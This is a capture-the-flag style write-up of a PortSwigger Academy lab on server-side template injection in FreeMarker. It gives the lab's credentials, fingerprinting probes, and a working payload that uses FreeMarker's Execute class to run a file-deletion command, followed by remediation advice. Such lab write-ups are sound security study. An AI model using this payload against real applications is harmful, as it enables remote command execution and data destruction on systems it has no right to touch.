# Lab: Server-Side Template Injection Using Documentation
- Date: 2024-01-22
- Platform: PortSwigger Academy
- Difficulty: Practitioner
- Vulnerability: Server-Side Template Injection (SSTI) in FreeMarker Template

## Lab Description
    This lab is vulnerable to server-side template injection. The challenge required identifying the template engine through documentation research and exploiting it to execute arbitrary code to delete the morale.txt file from Carlos's home directory.

## Key Steps
- Authentication: Logged in using credentials content-manager:C0nt3ntM4n4g3r
- Template Engine Identification: Tested various payloads to identify FreeMarker
- Documentation Research: Studied FreeMarker documentation for code execution methods
- Exploitation: Used FreeMarker's Execute utility class to run system commands
- File Deletion: Successfully executed file deletion command

## Vulnerable Endpoint
```
POST /product/template?productId=1
template=<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("rm /home/carlos/morale.txt") }
```

## Exploitation Payloads
    Template engine identification
        ${3*3}    // Returned "9" - confirmed FreeMarker
        #{3*3}    // Also executed

    File deletion payload
        <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("rm /home/carlos/morale.txt") }

## Attack Flow
```
Authentication → Template Engine Fingerprinting → Documentation Research → Code Execution → File Deletion
```

## Vulnerability Details
- Unsafe Template Processing: User input directly processed as FreeMarker template
- Administrative Interface: Content manager role had template editing capabilities
- Lack of Sandboxing: FreeMarker executed arbitrary Java code without restrictions
- Direct Code Execution: Access to freemarker.template.utility.Execute class

## FreeMarker Specific Exploitation
- Syntax: ${expression} and <#directive> for template operations
- Class Instantiation: "classname"?new() syntax creates new instances
- Execute Utility: freemarker.template.utility.Execute class allows command execution
- Variable Assignment: <#assign var=value> for storing object references

## Lesson Learned
- Template engine identification is crucial for successful exploitation
- Documentation research is essential for understanding engine-specific payloads
- Administrative interfaces with template editing are high-risk features
- FreeMarker's utility classes can be dangerously powerful if accessible
- Always sanitize user input in template processing contexts

## Remediation
- Implement strict input validation for template syntax
- Restrict or sandbox template engine capabilities in production
- Use whitelist-based approaches for allowed template functions
- Avoid giving users direct template editing capabilities
- Regularly review and update template engine configurations

# Real-World Impact: 
```FreeMarker template injection can lead to remote code execution, server compromise, and complete system control in Java web applications, especially in content management systems and applications with template editing features.```